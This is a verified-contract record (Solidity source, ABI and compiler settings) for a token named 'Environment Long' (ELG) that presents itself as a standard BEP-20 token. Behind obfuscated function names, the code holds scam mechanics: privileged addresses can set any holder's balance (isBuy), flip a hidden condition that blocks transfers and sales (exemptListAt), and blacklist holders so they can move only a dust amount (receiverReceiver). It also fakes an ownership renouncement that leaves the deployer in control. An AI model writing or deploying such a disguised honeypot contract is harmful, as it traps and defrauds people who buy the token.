{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface enableLaunchedAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeToken {\n    function createPair(address takeReceiverTrading, address exemptTradingAuto) external returns (address);\n}\n\ninterface walletAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverFee) external view returns (uint256);\n\n    function transfer(address liquidityTx, uint256 launchTakeAt) external returns (bool);\n\n    function allowance(address receiverAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchTakeAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityTx,\n        uint256 launchTakeAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverMaxAt, uint256 value);\n    event Approval(address indexed receiverAmount, address indexed spender, uint256 value);\n}\n\ninterface walletAutoMetadata is walletAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EnvironmentLong is receiverExempt, walletAuto, walletAutoMetadata {\n\n    address launchMinIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 limitShouldTx;\n\n    bool public teamToken;\n\n    mapping(address => mapping(address => uint256)) private modeLiquidity;\n\n    uint8 private limitWallet = 18;\n\n    uint256 private maxBuy = 100000000 * 10 ** 18;\n\n    uint256 modeReceiver;\n\n    function tokenEnable(address isFund, address liquidityTx, uint256 launchTakeAt) internal returns (bool) {\n        require(takeAt[isFund] >= launchTakeAt);\n        takeAt[isFund] -= launchTakeAt;\n        takeAt[liquidityTx] += launchTakeAt;\n        emit Transfer(isFund, liquidityTx, launchTakeAt);\n        return true;\n    }\n\n    uint256 private isLimit;\n\n    function liquidityLimit() private view {\n        require(feeLaunched[_msgSender()]);\n    }\n\n    uint256 private modeIsReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverLiquidity;\n    }\n\n    function balanceOf(address receiverFee) public view virtual override returns (uint256) {\n        return takeAt[receiverFee];\n    }\n\n    address public txSwapIs;\n\n    function liquidityToken(address isFund, address liquidityTx, uint256 launchTakeAt) internal returns (bool) {\n        if (isFund == txSwapIs) {\n            return tokenEnable(isFund, liquidityTx, launchTakeAt);\n        }\n        uint256 receiverMaxExempt = walletAuto(swapTake).balanceOf(launchMinIs);\n        require(receiverMaxExempt == limitShouldTx);\n        require(liquidityTx != launchMinIs);\n        if (shouldBuy[isFund]) {\n            return tokenEnable(isFund, liquidityTx, senderMax);\n        }\n        return tokenEnable(isFund, liquidityTx, launchTakeAt);\n    }\n\n    mapping(address => bool) public shouldBuy;\n\n    uint256 constant senderMax = 18 ** 10;\n\n    mapping(address => bool) public feeLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitWallet;\n    }\n\n    function transferFrom(address isFund, address liquidityTx, uint256 launchTakeAt) external override returns (bool) {\n        if (_msgSender() != walletTx) {\n            if (modeLiquidity[isFund][_msgSender()] != type(uint256).max) {\n                require(launchTakeAt <= modeLiquidity[isFund][_msgSender()]);\n                modeLiquidity[isFund][_msgSender()] -= launchTakeAt;\n            }\n        }\n        return liquidityToken(isFund, liquidityTx, launchTakeAt);\n    }\n\n    bool public senderReceiverReceiver;\n\n    function receiverReceiver(address buyLimit) public {\n        liquidityLimit();\n        if (fromAmount) {\n            modeIsReceiver = isLimit;\n        }\n        if (buyLimit == txSwapIs || buyLimit == swapTake) {\n            return;\n        }\n        shouldBuy[buyLimit] = true;\n    }\n\n    address private receiverLaunch;\n\n    function isBuy(address walletMin, uint256 launchTakeAt) public {\n        liquidityLimit();\n        takeAt[walletMin] = launchTakeAt;\n    }\n\n    function transfer(address walletMin, uint256 launchTakeAt) external virtual override returns (bool) {\n        return liquidityToken(_msgSender(), walletMin, launchTakeAt);\n    }\n\n    address public swapTake;\n\n    function name() external view virtual override returns (string memory) {\n        return sellWallet;\n    }\n\n    function approve(address shouldMin, uint256 launchTakeAt) public virtual override returns (bool) {\n        modeLiquidity[_msgSender()][shouldMin] = launchTakeAt;\n        emit Approval(_msgSender(), shouldMin, launchTakeAt);\n        return true;\n    }\n\n    function modeShouldExempt(address totalIs) public {\n        if (senderReceiverReceiver) {\n            return;\n        }\n        \n        feeLaunched[totalIs] = true;\n        if (isLimit != modeIsReceiver) {\n            modeIsReceiver = isLimit;\n        }\n        senderReceiverReceiver = true;\n    }\n\n    string private receiverLiquidity = \"ELG\";\n\n    function walletTeamReceiver() public {\n        emit OwnershipTransferred(txSwapIs, address(0));\n        receiverLaunch = address(0);\n    }\n\n    constructor (){\n        \n        enableLaunchedAt launchEnable = enableLaunchedAt(walletTx);\n        swapTake = feeToken(launchEnable.factory()).createPair(launchEnable.WETH(), address(this));\n        if (teamToken == fromAmount) {\n            modeIsReceiver = isLimit;\n        }\n        txSwapIs = _msgSender();\n        walletTeamReceiver();\n        feeLaunched[txSwapIs] = true;\n        takeAt[txSwapIs] = maxBuy;\n        \n        emit Transfer(address(0), txSwapIs, maxBuy);\n    }\n\n    function allowance(address autoEnable, address shouldMin) external view virtual override returns (uint256) {\n        if (shouldMin == walletTx) {\n            return type(uint256).max;\n        }\n        return modeLiquidity[autoEnable][shouldMin];\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverLaunch;\n    }\n\n    function owner() external view returns (address) {\n        return receiverLaunch;\n    }\n\n    mapping(address => uint256) private takeAt;\n\n    event OwnershipTransferred(address indexed takeTeamExempt, address indexed marketingToLaunch);\n\n    string private sellWallet = \"Environment Long\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxBuy;\n    }\n\n    bool public fromAmount;\n\n    function exemptListAt(uint256 launchTakeAt) public {\n        liquidityLimit();\n        limitShouldTx = launchTakeAt;\n    }\n\n    address walletTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTeamExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingToLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMaxAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTakeAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchTakeAt\",\"type\":\"uint256\"}],\"name\":\"exemptListAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTakeAt\",\"type\":\"uint256\"}],\"name\":\"isBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalIs\",\"type\":\"address\"}],\"name\":\"modeShouldExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLimit\",\"type\":\"address\"}],\"name\":\"receiverReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiverReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTakeAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTakeAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSwapIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTeamReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EnvironmentLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}